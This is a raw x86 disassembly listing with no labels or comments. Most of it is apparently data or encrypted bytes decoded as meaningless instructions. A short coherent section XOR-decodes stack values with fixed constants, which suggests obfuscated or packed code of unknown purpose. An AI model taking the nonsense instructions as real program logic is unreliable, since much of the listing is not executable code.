  41eb2b:	sbb    BYTE PTR [eax],ah
  41eb2d:	push   esp
  41eb2e:	(bad)  
  41eb2f:	xor    esp,edi
  41eb31:	mov    ebp,0x62ead9b
  41eb36:	les    esi,FWORD PTR [edi+ebx*8+0x5a77d428]
  41eb3d:	dec    ebp
  41eb3e:	pop    ss
  41eb3f:	push   edx
  41eb40:	aas    
  41eb41:	or     eax,0x944f9d25
  41eb46:	mov    DWORD PTR [edx-0x5244c41f],edi
  41eb4c:	or     BYTE PTR [ecx],dl
  41eb4e:	or     al,0xa2
  41eb50:	test   BYTE PTR [esi+eiz*2+0xa09104],al
  41eb57:	fsub   st(5),st
  41eb59:	push   0xffffffd2
  41eb5b:	mov    bl,0xbe
  41eb5d:	dec    ecx
  41eb5e:	pop    ebp
  41eb5f:	sub    DWORD PTR [edx],0x64
  41eb62:	stos   BYTE PTR es:[edi],al
  41eb63:	jecxz  0x41eb80
  41eb65:	fiadd  DWORD PTR [ecx-0x3d33e5df]
  41eb6b:	xchg   esi,eax
  41eb6c:	push   0xffffff81
  41eb6e:	out    0x19,eax
  41eb70:	fs xchg edx,eax
  41eb72:	enter  0xacc2,0x99
  41eb76:	dec    ecx
  41eb77:	pop    eax
  41eb78:	cmp    al,al
  41eb7a:	jmp    0x41eb72
  41eb7c:	cmp    DWORD PTR [ecx+0x35],0xff45236c
  41eb83:	mov    edi,0xb7361543
  41eb88:	int    0x76
  41eb8a:	(bad)  
  41eb8b:	jg     0x41eb1e
  41eb8d:	sbb    esi,DWORD PTR ds:0xb903593e
  41eb93:	sub    BYTE PTR [ebx],cl
  41eb95:	imul   esi,DWORD PTR [ebx+0x74],0xffffff97
  41eb99:	fistp  WORD PTR [eax+0x56]
  41eb9c:	(bad)  
  41eb9d:	push   ecx
  41eb9e:	arpl   WORD PTR [ebx+0x7a27423b],si
  41eba4:	imul   edi,DWORD PTR [edx],0x4a
  41eba7:	(bad)  
  41eba9:	jle    0x41eb9c
  41ebab:	adc    al,0x69
  41ebad:	call   0xb5f0:0xfad129b1
  41ebb4:	jmp    0xf82132ac
  41ebb9:	(bad)  [edi]
  41ebbb:	push   ss
  41ebbc:	mov    BYTE PTR [ebp+0x55],0xe5
  41ebc0:	push   ss
  41ebc1:	sbb    al,0x57
  41ebc3:	and    DWORD PTR [ecx],edi
  41ebc5:	xor    al,0x45
  41ebc7:	adc    DWORD PTR [eax+0x7a517cd9],esp
  41ebcd:	sbb    DWORD PTR [edx-0x43384593],ebp
  41ebd3:	mov    ebp,0xdbeba52e
  41ebd8:	repz dec ecx
  41ebda:	add    BYTE PTR [ebx],dl
  41ebdc:	retf   
  41ebdd:	adc    eax,0x4895d534
  41ebe2:	xlat   BYTE PTR ds:[ebx]
  41ebe3:	jmp    0x43dd483e
  41ebe8:	mov    ecx,0xfd355bc
  41ebed:	sahf   
  41ebee:	xchg   DWORD PTR [ebx+0x44],ecx
  41ebf1:	cwde   
  41ebf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebf3:	cwde   
  41ebf4:	fcomp  DWORD PTR [esi+0x66]
  41ebf7:	pop    ss
  41ebf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebf9:	push   ds
  41ebfa:	lock jp 0x41ec6e
  41ebfd:	pop    ds
  41ebfe:	je     0x41f05a
  41ec04:	mov    eax,DWORD PTR [ebp-0x154]
  41ec0a:	jmp    0x41eff1
  41ec0f:	cld    
  41ec10:	sbb    eax,0x6c1c4604
  41ec15:	mov    esp,0x10e976b3
  41ec1a:	sahf   
  41ec1b:	jmp    0x41ec8d
  41ec1d:	retf   
  41ec1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec1f:	xor    esi,DWORD PTR [edi-0x40]
  41ec22:	mov    esi,0xbebec44a
  41ec27:	mov    al,ds:0xac93efb0
  41ec2c:	mov    edi,0x3564544f
  41ec31:	into   
  41ec32:	add    DWORD PTR [eax],edx
  41ec34:	mov    edx,0xca53485f
  41ec39:	xchg   edx,eax
  41ec3a:	inc    ebx
  41ec3b:	cdq    
  41ec3c:	scas   eax,DWORD PTR es:[edi]
  41ec3d:	push   0xffffff87
  41ec3f:	xor    al,0xce
  41ec41:	les    esi,FWORD PTR [edx]
  41ec43:	push   0x27
  41ec45:	inc    eax
  41ec46:	xchg   ebp,eax
  41ec47:	shl    BYTE PTR [ebp+0x9],1
  41ec4a:	fsub   QWORD PTR [ebp+ebp*8-0x37]
  41ec4e:	or     eax,0x6525f670
  41ec53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec55:	jecxz  0x41ec3a
  41ec57:	and    ch,BYTE PTR [edx+0x68b811a0]
  41ec5d:	and    eax,0xba8da648
  41ec62:	adc    al,0x9f
  41ec64:	sub    eax,0x72a3729f
  41ec69:	cmc    
  41ec6a:	aaa    
  41ec6b:	in     al,dx
  41ec6c:	imul   esp,DWORD PTR [ecx+0x2015205],0x76
  41ec73:	adc    ecx,edx
  41ec75:	iret   
  41ec76:	mov    bl,0x52
  41ec78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec79:	adc    ch,BYTE PTR [ecx]
  41ec7b:	loopne 0x41ec7c
  41ec7d:	xchg   ecx,eax
  41ec7e:	es retf 0x6f0c
  41ec82:	retf   
  41ec83:	sbb    eax,DWORD PTR [ecx-0x68]
  41ec86:	inc    ecx
  41ec87:	push   ecx
  41ec88:	sbb    ebx,DWORD PTR [esi+0x28]
  41ec8b:	mov    ah,0x30
  41ec8d:	mov    ecx,0x6834c707
  41ec92:	or     esi,DWORD PTR [ebx+esi*1]
  41ec95:	push   ds
  41ec96:	popa   
  41ec97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec98:	scas   al,BYTE PTR es:[edi]
  41ec99:	ins    DWORD PTR es:[edi],dx
  41ec9a:	cmp    BYTE PTR [edx+0x3f],0xfa
  41ec9e:	outs   dx,DWORD PTR ds:[esi]
  41ec9f:	mov    ch,0x9e
  41eca1:	std    
  41eca2:	int    0x6e
  41eca4:	cs in  al,dx
  41eca6:	out    0x6f,al
  41eca8:	fsub   QWORD PTR [ebx-0x22]
  41ecab:	cwde   
  41ecac:	loope  0x41ecd4
  41ecae:	sub    BYTE PTR [edx],cl
  41ecb0:	loopne 0x41eca5
  41ecb2:	adc    edi,DWORD PTR [eax-0x593e9ce7]
  41ecb8:	cld    
  41ecb9:	mov    ch,0x74
  41ecbb:	add    dl,BYTE PTR [ecx-0x2]
  41ecbe:	ja     0x41ec5f
  41ecc0:	pop    esi
  41ecc1:	out    0x56,eax
  41ecc3:	dec    eax
  41ecc4:	sub    edx,0xffffffd3
  41ecc7:	push   esp
  41ecc8:	jmp    0x41ecff
  41ecca:	push   0xffffffea
  41eccc:	stos   BYTE PTR es:[edi],al
  41eccd:	in     eax,0xa2
  41eccf:	mov    ds,WORD PTR [edi]
  41ecd1:	push   esi
  41ecd2:	and    eax,eax
  41ecd4:	pusha  
  41ecd5:	add    eax,0x1808af97
  41ecda:	add    eax,0x15c1283c
  41ecdf:	xchg   BYTE PTR [ecx],dl
  41ece1:	leave  
  41ece2:	and    esi,esp
  41ece4:	addr16 cld 
  41ece6:	jg     0x41ec6a
  41ece8:	cmp    DWORD PTR [ecx+0x20],esi
  41eceb:	icebp  
  41ecec:	push   edx
  41eced:	test   eax,0x765425dd
  41ecf2:	add    eax,DWORD PTR [edx]
  41ecf4:	stos   DWORD PTR es:[edi],eax
  41ecf5:	or     BYTE PTR [edi+0x1198561c],bh
  41ecfb:	pop    edi
  41ecfc:	add    ecx,DWORD PTR [ebx+0x230de5b1]
  41ed02:	dec    ecx
  41ed03:	jmp    0xdc0e:0x2093283c
  41ed0a:	mov    al,ds:0x78bc13c
  41ed0f:	push   ebx
  41ed10:	and    ah,BYTE PTR [esi]
  41ed12:	xchg   edx,eax
  41ed13:	adc    eax,0x14d99820
  41ed18:	mov    ds:0xd5cc1c66,eax
  41ed1d:	test   edi,ebp
  41ed1f:	jb     0x41ed68
  41ed21:	add    ch,ch
  41ed23:	pop    esi
  41ed24:	cmp    BYTE PTR [ebx-0x71dab4b7],bh
  41ed2a:	sbb    BYTE PTR [edx],dl
  41ed2c:	hlt    
  41ed2d:	in     al,0x2
  41ed2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed31:	repz fsubr DWORD PTR [esi]
  41ed34:	rcl    BYTE PTR [ebp-0x64f4ec0e],0xc5
  41ed3b:	dec    edi
  41ed3c:	inc    ecx
  41ed3d:	add    dl,BYTE PTR [edx+ebx*4]
  41ed40:	(bad)  
  41ed42:	pop    edx
  41ed43:	push   cs
  41ed44:	sar    BYTE PTR [si+0x27],0x1
  41ed49:	fs mov esp,0x11c0f5e0
  41ed4f:	(bad)  
  41ed50:	stc    
  41ed51:	or     DWORD PTR [ebp+0x67],ebx
  41ed54:	xlat   BYTE PTR ds:[ebx]
  41ed55:	xchg   ecx,eax
  41ed56:	lods   eax,DWORD PTR ds:[esi]
  41ed57:	xchg   edi,eax
  41ed58:	scas   eax,DWORD PTR es:[edi]
  41ed59:	es sub eax,0xb960a7db
  41ed5f:	je     0x41ed37
  41ed61:	pop    esp
  41ed62:	(bad)  
  41ed63:	and    ebx,esp
  41ed65:	xchg   BYTE PTR [eax+0x63],ch
  41ed68:	dec    edi
  41ed69:	add    cl,ch
  41ed6b:	scas   al,BYTE PTR es:[edi]
  41ed6c:	jns    0x41ed3b
  41ed6e:	mov    gs,WORD PTR [ecx+0x2c]
  41ed71:	out    0x72,al
  41ed73:	inc    eax
  41ed74:	mov    ebx,0xcafb8329
  41ed79:	cwde   
  41ed7a:	iret   
  41ed7b:	mov    edx,0xb657d1a6
  41ed80:	push   esi
  41ed81:	adc    bh,BYTE PTR [ecx+0x6a7924c4]
  41ed87:	mov    ebp,0x29752e79
  41ed8c:	fcmovnu st,st(5)
  41ed8e:	mov    edi,0x3437989b
  41ed93:	mov    ah,0xc6
  41ed95:	inc    edi
  41ed96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed97:	mov    bl,0x1b
  41ed99:	mov    ds:0x5f596c14,eax
  41ed9e:	mov    dh,0xe8
  41eda0:	jnp    0x41ed2e
  41eda2:	ror    BYTE PTR [edx],0x8c
  41eda5:	lahf   
  41eda6:	xor    eax,DWORD PTR [edi]
  41eda8:	inc    edx
  41eda9:	xchg   BYTE PTR [eax-0x24],ch
  41edac:	loop   0x41ee02
  41edae:	xchg   ebx,eax
  41edaf:	cmp    esp,DWORD PTR [ebx]
  41edb1:	(bad)  
  41edb2:	mov    BYTE PTR [edx],dh
  41edb4:	or     eax,0x8d1f9b6d
  41edb9:	cdq    
  41edba:	jmp    0x41ed5b
  41edbc:	inc    edx
  41edbd:	mov    ah,BYTE PTR [edx+eiz*8-0xc465871]
  41edc4:	pop    ecx
  41edc5:	lods   eax,DWORD PTR ds:[esi]
  41edc6:	xchg   esi,eax
  41edc7:	cwde   
  41edc8:	(bad)  
  41edc9:	sub    al,0x95
  41edcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edcc:	jmp    0x41ee3e
  41edce:	sahf   
  41edcf:	inc    esi
  41edd0:	test   al,0x72
  41edd2:	xor    DWORD PTR ds:0x3c904e00,ecx
  41edd8:	adc    DWORD PTR [ebx],edx
  41edda:	inc    edi
  41eddb:	mov    al,ds:0xdf904076
  41ede0:	in     eax,0xf9
  41ede2:	aam    0xf
  41ede4:	sub    BYTE PTR [esi+0x1f],ah
  41ede7:	mov    eax,cs
  41ede9:	je     0x41edec
  41edeb:	lds    esi,FWORD PTR [ecx-0x62]
  41edee:	sbb    eax,esp
  41edf0:	pop    eax
  41edf1:	xchg   edi,eax
  41edf2:	inc    esi
  41edf3:	push   es
  41edf4:	sub    ebx,DWORD PTR [ecx-0x7d3e790b]
  41edfa:	mov    ebx,0xcd200a2e
  41edff:	cmp    BYTE PTR [esi+esi*8+0x44],0xe7
  41ee04:	jmp    DWORD PTR [ecx]
  41ee06:	xlat   BYTE PTR ds:[ebx]
  41ee07:	jl     0x41edb8
  41ee09:	xchg   esp,eax
  41ee0a:	mov    ds:0x7d95e9,eax
  41ee0f:	and    ch,0x3e
  41ee12:	lock jnp 0x41ee86
  41ee15:	mov    ecx,0xf7c6f352
  41ee1a:	repz lock xor ebx,eax
  41ee1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee1f:	or     DWORD PTR [esi],edi
  41ee21:	ret    0x9597
  41ee24:	mov    ds:0x95568386,al
  41ee29:	in     eax,0x82
  41ee2b:	rcl    BYTE PTR [eax-0x7],cl
  41ee2e:	pop    esp
  41ee2f:	xor    al,0xb5
  41ee31:	and    esp,DWORD PTR [esi+0xe]
  41ee34:	sub    eax,0x7b4e9c34
  41ee39:	jp     0x41edf1
  41ee3b:	pop    es
  41ee3c:	dec    esp
  41ee3d:	dec    esp
  41ee3e:	sbb    BYTE PTR [ebx-0x246034c4],bh
  41ee44:	aas    
  41ee45:	dec    esp
  41ee46:	dec    ebp
  41ee47:	out    0x7a,eax
  41ee49:	push   ebp
  41ee4a:	or     ebx,DWORD PTR [ebx+0x1c]
  41ee4d:	inc    ecx
  41ee4e:	jmp    0x41ee08
  41ee50:	adc    DWORD PTR [eax],esp
  41ee52:	xchg   esi,eax
  41ee53:	add    bl,BYTE PTR [ebp+eiz*2-0x7c0438e]
  41ee5a:	in     al,dx
  41ee5b:	adc    cl,al
  41ee5d:	adc    dh,BYTE PTR [ebx]
  41ee5f:	out    0x5a,al
  41ee61:	sub    al,0x83
  41ee63:	ficomp DWORD PTR [ebp+eax*2+0x36]
  41ee67:	sbb    ch,ch
  41ee69:	cmc    
  41ee6a:	cmc    
  41ee6b:	sbb    ebx,DWORD PTR [eiz*1-0x2ccdc7c9]
  41ee72:	fnstsw WORD PTR [edi]
  41ee74:	xchg   ebx,eax
  41ee75:	call   0x1a94:0x174b2cd9
  41ee7c:	lods   eax,DWORD PTR ds:[esi]
  41ee7d:	iret   
  41ee7e:	jae    0x41ee43
  41ee80:	mov    ds:0x8feb3338,eax
  41ee85:	push   ebp
  41ee86:	push   edi
  41ee87:	lods   al,BYTE PTR ds:[esi]
  41ee88:	neg    DWORD PTR [esi-0x35195a9b]
  41ee8e:	ror    dh,1
  41ee90:	daa    
  41ee91:	mov    edx,ecx
  41ee93:	aaa    
  41ee94:	push   es
  41ee95:	dec    esp
  41ee96:	sar    DWORD PTR [ebx-0x1ce677f7],cl
  41ee9c:	nop
  41ee9d:	push   edx
  41ee9e:	and    esi,0x7a
  41eea1:	adc    al,0xdd
  41eea3:	ss pop ebp
  41eea5:	jmp    0xabb2:0x347f7e24
  41eeac:	mov    gs,ebx
  41eeae:	pop    ecx
  41eeaf:	adc    ebx,DWORD PTR [eax+0x2811177b]
  41eeb5:	xchg   ebx,eax
  41eeb6:	cli    
  41eeb7:	int3   
  41eeb8:	jmp    0x584a70f2
  41eebd:	cmp    al,0x19
  41eebf:	fmulp  st(7),st
  41eec1:	jne    0x41ee52
  41eec3:	jmp    0xefce:0xd4df0d29
  41eeca:	ds xor eax,0xf1e9aa67
  41eed0:	or     eax,0x27e2d46
  41eed5:	mov    ds:0x52dc809a,eax
  41eeda:	lock cmc 
  41eedc:	jnp    0x41eeb6
  41eede:	xlat   BYTE PTR ds:[ebx]
  41eedf:	lods   al,BYTE PTR ds:[esi]
  41eee0:	dec    edi
  41eee1:	xchg   esp,eax
  41eee2:	or     bh,BYTE PTR [ecx]
  41eee4:	sbb    edi,ecx
  41eee6:	out    dx,al
  41eee7:	adc    BYTE PTR [edi+0x1d640fcd],0xee
  41eeee:	dec    esi
  41eeef:	jp     0x41ef26
  41eef1:	or     dh,BYTE PTR ds:0x40bbcc15
  41eef7:	adc    ah,ah
  41eef9:	or     DWORD PTR [ecx+0x11fbfe8f],edi
  41eeff:	jbe    0x41eefa
  41ef01:	daa    
  41ef02:	aaa    
  41ef03:	jbe    0x41ef11
  41ef05:	mov    esi,0x29aa15de
  41ef0a:	adc    BYTE PTR [edx+eiz*4],ah
  41ef0d:	stos   DWORD PTR es:[edi],eax
  41ef0e:	xchg   BYTE PTR [esi],bh
  41ef10:	mov    dl,0xde
  41ef12:	lods   eax,DWORD PTR ds:[esi]
  41ef13:	cdq    
  41ef14:	or     cl,al
  41ef16:	jge    0x41ee99
  41ef18:	cmp    eax,0x3876d3f9
  41ef1d:	fldenv [esi]
  41ef1f:	push   0x59e9a581
  41ef24:	popa   
  41ef25:	repnz fldcw WORD PTR cs:[edi+0x42]
  41ef2a:	repnz pushf 
  41ef2c:	mov    bh,0x62
  41ef2e:	stos   DWORD PTR es:[edi],eax
  41ef2f:	in     al,dx
  41ef30:	jmp    0x41eeb2
  41ef32:	lds    ebx,FWORD PTR [esi]
  41ef34:	jbe    0x41eef7
  41ef36:	retf   
  41ef37:	pop    eax
  41ef38:	mov    eax,0x7d7bb2e0
  41ef3d:	dec    edi
  41ef3e:	jae    0x41ef87
  41ef40:	sub    DWORD PTR ds:[ebp+edx*2-0x3139515a],ebx
  41ef48:	jl     0x41ef5b
  41ef4a:	loope  0x41eed0
  41ef4c:	scas   al,BYTE PTR es:[edi]
  41ef4d:	dec    ecx
  41ef4e:	loop   0x41ef5a
  41ef50:	xlat   BYTE PTR ds:[ebx]
  41ef51:	jo     0x41eee8
  41ef53:	xlat   BYTE PTR ds:[ebx]
  41ef54:	ret    
  41ef55:	(bad)  
  41ef57:	dec    eax
  41ef58:	addr16 faddp st(4),st
  41ef5b:	std    
  41ef5c:	and    ebp,ebx
  41ef5e:	test   DWORD PTR [edx],ebx
  41ef60:	mov    bh,0x3c
  41ef62:	jecxz  0x41ef0e
  41ef64:	mov    dl,0xf
  41ef66:	add    al,0x86
  41ef68:	ja     0x41ef55
  41ef6a:	fs adc al,0x3f
  41ef6d:	les    ebp,FWORD PTR [esi+0x1]
  41ef70:	test   BYTE PTR [eax],cl
  41ef72:	sbb    al,BYTE PTR [ebx-0x4687548]
  41ef78:	fs jecxz 0x41ef41
  41ef7b:	test   ecx,eax
  41ef7d:	add    DWORD PTR es:[edx],ebp
  41ef80:	fsubr  DWORD PTR [eax-0x78]
  41ef83:	push   edx
  41ef84:	aaa    
  41ef85:	sar    DWORD PTR [edi],0xf4
  41ef88:	inc    ecx
  41ef89:	dec    ebx
  41ef8a:	aam    0x8e
  41ef8c:	cmp    BYTE PTR [ecx-0x41],bh
  41ef8f:	sbb    eax,0x5f317686
  41ef94:	pop    ds
  41ef95:	cs jmp 0x41efb8
  41ef98:	mov    ah,0x7
  41ef9a:	add    eax,0xcafcdc44
  41ef9f:	pop    eax
  41efa0:	mov    ebp,0xfae9ed3d
  41efa5:	push   eax
  41efa6:	iret   
  41efa7:	arpl   WORD PTR [ecx-0x65ed4faa],bx
  41efad:	shl    DWORD PTR [ebp+eiz*4-0x48],0x79
  41efb2:	xlat   BYTE PTR ds:[ebx]
  41efb3:	std    
  41efb4:	sbb    eax,ebx
  41efb6:	jle    0x41ef8d
  41efb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efb9:	loope  0x41efe8
  41efbb:	pop    esp
  41efbc:	adc    al,0xf0
  41efbe:	mov    bh,0x6
  41efc0:	mov    eax,ds:0xd75bdb81
  41efc5:	daa    
  41efc6:	jb     0x41ef8a
  41efc8:	retf   0xcca
  41efcb:	fcom   DWORD PTR [ecx]
  41efcd:	xchg   ebx,eax
  41efce:	imul   eax,DWORD PTR [edx-0x2b39cdb],0xfffffff7
  41efd5:	pop    ebx
  41efd6:	loopne 0x41efe7
  41efd8:	cmp    ecx,edi
  41efda:	(bad)  
  41efdb:	mov    ah,0x6e
  41efdd:	outs   dx,DWORD PTR ds:[esi]
  41efde:	add    ah,bh
  41efe0:	cmp    bh,BYTE PTR [ebx]
  41efe2:	jmp    0x41f048
  41efe4:	mov    esi,0xa58c8637
  41efe9:	inc    edi
  41efea:	hlt    
  41efeb:	mov    ds:0x7e9bfda3,eax
  41eff0:	push   esi
  41eff1:	mov    edx,DWORD PTR [ebp-0x150]
  41eff7:	xor    eax,0xcb79b576
  41effc:	xor    edx,0x9c2b8ae8
  41f002:	mov    cl,0x2
  41f004:	call   0x408bb8
  41f009:	mov    esi,eax
  41f00b:	mov    edi,edx
  41f00d:	mov    eax,DWORD PTR [ebp-0x154]
  41f013:	mov    edx,DWORD PTR [ebp-0x150]
  41f019:	xor    eax,0xcb79b576
  41f01e:	xor    edx,0x9c2b8ae8
  41f024:	mov    cl,0x3e
  41f026:	call   0x4223fa
  41f02b:	or     esi,eax
  41f02d:	or     edi,edx
  41f02f:	mov    eax,DWORD PTR [ebp-0x160]
  41f035:	imul   esi,eax
  41f038:	add    esi,DWORD PTR [ebp-0x170]
  41f03e:	mov    DWORD PTR [ebp-0x16c],esi
  41f044:	mov    eax,DWORD PTR [ebp-0x16c]
  41f04a:	mov    DWORD PTR [ebp-0x178],eax
  41f050:	jmp    0x41f19e
  41f055:	jmp    0x41f105
  41f05a:	mov    eax,DWORD PTR [ebp-0x154]
  41f060:	mov    edx,DWORD PTR [ebp-0x150]
  41f066:	xor    eax,0xcb79b576
  41f06b:	xor    edx,0x9c2b8ae8
  41f071:	mov    cl,0x2
  41f073:	call   0x408bb8
  41f078:	mov    esi,eax
  41f07a:	mov    edi,edx
  41f07c:	mov    eax,DWORD PTR [ebp-0x154]
  41f082:	mov    edx,DWORD PTR [ebp-0x150]
  41f088:	xor    eax,0xcb79b576
  41f08d:	xor    edx,0x9c2b8ae8
  41f093:	mov    cl,0x3e
  41f095:	call   0x4223fa
  41f09a:	or     esi,eax
  41f09c:	or     edi,edx
  41f09e:	mov    eax,DWORD PTR [ebp-0x15c]
  41f0a4:	mov    edx,DWORD PTR [ebp-0x158]
  41f0aa:	xor    eax,0xcb79b576
  41f0af:	xor    edx,0x9c2b8ae8
  41f0b5:	mov    cl,0x2
  41f0b7:	call   0x408bb8
  41f0bc:	mov    ebx,eax
  41f0be:	mov    eax,edx
  41f0c0:	mov    ecx,DWORD PTR [ebp-0x15c]
  41f0c6:	mov    edx,DWORD PTR [ebp-0x158]
  41f0cc:	xor    ecx,0xcb79b576
  41f0d2:	xor    edx,0x9c2b8ae8
  41f0d8:	mov    DWORD PTR [ebp-0x234],eax
  41f0de:	mov    eax,ecx
  41f0e0:	mov    cl,0x3e
  41f0e2:	call   0x4223fa
  41f0e7:	or     ebx,eax
  41f0e9:	mov    eax,DWORD PTR [ebp-0x234]
  41f0ef:	or     eax,edx
  41f0f1:	push   eax
  41f0f2:	push   ebx
  41f0f3:	push   edi
  41f0f4:	push   esi
  41f0f5:	call   0x41594e
  41f0fa:	mov    DWORD PTR [ebp-0x178],eax
  41f100:	jmp    0x41f19e
  41f105:	mov    eax,DWORD PTR [ebp-0x15c]
  41f10b:	mov    edx,DWORD PTR [ebp-0x158]
  41f111:	xor    eax,0xcb79b576
  41f116:	xor    edx,0x9c2b8ae8
  41f11c:	mov    cl,0x2
  41f11e:	call   0x408bb8
  41f123:	mov    esi,eax
  41f125:	mov    edi,edx
  41f127:	mov    eax,DWORD PTR [ebp-0x15c]
  41f12d:	mov    edx,DWORD PTR [ebp-0x158]
  41f133:	xor    eax,0xcb79b576
  41f138:	xor    edx,0x9c2b8ae8
  41f13e:	mov    cl,0x3e
  41f140:	call   0x4223fa
  41f145:	or     esi,eax
  41f147:	or     edi,edx
  41f149:	mov    DWORD PTR [ebp-0x178],esi
  41f14f:	jmp    0x41f19e
  41f154:	mov    eax,DWORD PTR [ebp-0x15c]
  41f15a:	mov    edx,DWORD PTR [ebp-0x158]
  41f160:	xor    eax,0xcb79b576
  41f165:	xor    edx,0x9c2b8ae8
  41f16b:	mov    cl,0x2
  41f16d:	call   0x408bb8
  41f172:	mov    esi,eax
  41f174:	mov    edi,edx
  41f176:	mov    eax,DWORD PTR [ebp-0x15c]
  41f17c:	mov    edx,DWORD PTR [ebp-0x158]
  41f182:	xor    eax,0xcb79b576
  41f187:	xor    edx,0x9c2b8ae8
  41f18d:	mov    cl,0x3e
  41f18f:	call   0x4223fa
  41f194:	or     esi,eax
  41f196:	or     edi,edx
  41f198:	mov    DWORD PTR [ebp-0x178],esi
  41f19e:	mov    ecx,DWORD PTR [ebp-0xd8]
  41f1a4:	mov    eax,0x459a
  41f1a9:	xor    edx,edx
  41f1ab:	div    ecx
  41f1ad:	jmp    0x41f594
  41f1b2:	push   edx
  41f1b3:	inc    ebx
  41f1b4:	sbb    eax,0xbcab304b
  41f1b9:	pop    esp
  41f1ba:	or     edi,DWORD PTR [edx]
  41f1bc:	cld    
  41f1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1be:	dec    edi
  41f1bf:	and    BYTE PTR [eax-0x3f803f1d],ch
  41f1c5:	mov    esi,0xbebec44a
  41f1ca:	int    0x71
  41f1cc:	pop    esi
  41f1cd:	xchg   edx,eax
  41f1ce:	jo     0x41f1aa
  41f1d0:	outs   dx,BYTE PTR ds:[esi]
  41f1d1:	call   0x1983a5db
  41f1d6:	int    0xee
  41f1d8:	pushf  
  41f1d9:	aaa    
  41f1da:	fistp  WORD PTR [ebx]
  41f1dc:	cmp    al,0x2
  41f1de:	push   eax
  41f1df:	add    ebp,DWORD PTR [ebp-0x1d]
  41f1e2:	rcr    BYTE PTR [eax],0xd3
  41f1e5:	sbb    eax,0xf9969afc
  41f1ea:	sub    DWORD PTR [ebx-0x79],0xffffffc0
  41f1ee:	mov    eax,ds:0xb0360c2
  41f1f3:	jp     0x41f26b
  41f1f5:	mov    ebx,0xfba3d429
  41f1fa:	dec    edx
  41f1fb:	xchg   ebp,eax
  41f1fc:	cmp    bl,al
  41f1fe:	jns    0x41f1fa
  41f200:	and    ebx,DWORD PTR [ecx-0x3]
  41f203:	hlt    
  41f204:	mov    edi,0x31f93bb5
  41f209:	pop    edi
  41f20a:	je     0x41f216
  41f20c:	repz add ecx,DWORD PTR [edx]
  41f20f:	xor    eax,0xdc6d5dff
  41f214:	addr16 push esp
  41f216:	sub    DWORD PTR [ebx+0x48dadd87],ebx
  41f21c:	sti    
  41f21d:	jmp    0xf1f0:0xb8c000c6
  41f224:	jmp    FWORD PTR [eax+esi*2+0x11]
  41f228:	mov    ebp,0xfcfb7626
  41f22d:	mov    esp,0x286c27d1
  41f232:	mov    ds:0x4f46471b,eax
  41f237:	je     0x41f1e4
  41f239:	and    BYTE PTR [ebx],ah
  41f23b:	(bad)  
  41f23c:	out    dx,eax
  41f23d:	and    DWORD PTR [eax+eiz*4-0x723d370d],0x787e850d
  41f248:	add    BYTE PTR ds:0x5a149e4e,ah
  41f24e:	or     esp,DWORD PTR [eax-0x29f922f]
  41f254:	shl    BYTE PTR [eax-0x51086842],cl
  41f25a:	sbb    DWORD PTR [eax+0x67],0xf3d8bc1a
  41f261:	mov    dh,0xae
  41f263:	dec    esi
  41f264:	push   ss
  41f265:	jg     0x41f22b
  41f267:	fdivr  DWORD PTR [ecx+0x53]
  41f26a:	fisub  DWORD PTR gs:[ebx-0x110fe489]
  41f271:	dec    eax
  41f272:	dec    edx
  41f273:	loopne 0x41f2d3
  41f275:	push   ebp
  41f276:	imul   esp,DWORD PTR [eax-0x7050a62],0xfa7b2afc
  41f280:	cmp    DWORD PTR [eax+0x7d32b7f6],eax
  41f286:	dec    edi
  41f287:	popf   
  41f288:	add    BYTE PTR [edi-0x79],al
  41f28b:	jne    0x41f240
  41f28d:	mov    eax,ds:0xdf49834b
  41f292:	inc    edi
  41f293:	ins    DWORD PTR es:[edi],dx
  41f294:	retf   0x1d13
  41f297:	jbe    0x41f2ad
  41f299:	mov    ah,0x49
  41f29b:	ret    
  41f29c:	add    BYTE PTR [ebp+0x75],bh
  41f29f:	dec    esp
  41f2a0:	iret   
  41f2a1:	bnd ret 
  41f2a3:	aam    0x83
  41f2a5:	adc    bh,dh
  41f2a7:	sub    DWORD PTR [edx],edi
  41f2a9:	dec    ecx
  41f2aa:	adc    DWORD PTR [eax+0x2e],eax
  41f2ad:	sub    esp,DWORD PTR [ecx-0x5d]
  41f2b0:	addr16 mov ds:0xa376,eax
  41f2b4:	adc    BYTE PTR [ebp+0x1b],dl
  41f2b7:	test   BYTE PTR [esi+0x1a],dl
  41f2ba:	(bad)
  41f2bd:	add    ecx,DWORD PTR ds:0xff473d42
  41f2c3:	pop    esi
  41f2c4:	jnp    0x41f277
  41f2c6:	add    ebp,ebp
  41f2c8:	popa   
  41f2c9:	jno    0x41f2e9
  41f2cb:	adc    DWORD PTR ds:0xcbd43d94,ebx
  41f2d1:	mov    esp,0x67269ca0
  41f2d6:	ja     0x41f277
  41f2d8:	inc    esp
  41f2d9:	add    bl,al
  41f2db:	push   esp
  41f2dc:	cwde   
  41f2dd:	dec    edi
  41f2de:	inc    ebp
  41f2df:	ins    BYTE PTR es:[edi],dx
  41f2e0:	loop   0x41f357
  41f2e2:	add    eax,0x63c14458
  41f2e7:	call   0xd00f3f10
  41f2ec:	adc    DWORD PTR [edi+esi*4],0x71
  41f2f0:	stos   BYTE PTR es:[edi],al
  41f2f1:	jmp    DWORD PTR [eax+0x30]
  41f2f4:	(bad)  
  41f2f5:	fiadd  WORD PTR [eax-0x6986d932]
  41f2fb:	adc    dh,bl
  41f2fd:	imul   edx,DWORD PTR [ebx+0x56],0x7
  41f301:	(bad)  
  41f302:	out    0x78,al
  41f304:	mov    dh,0xf1
  41f306:	dec    esp
  41f307:	lods   al,BYTE PTR ds:[esi]
  41f308:	pop    esp
  41f309:	call   0x9d3a4390
  41f30e:	xchg   BYTE PTR [ebx],cl
  41f310:	popa   
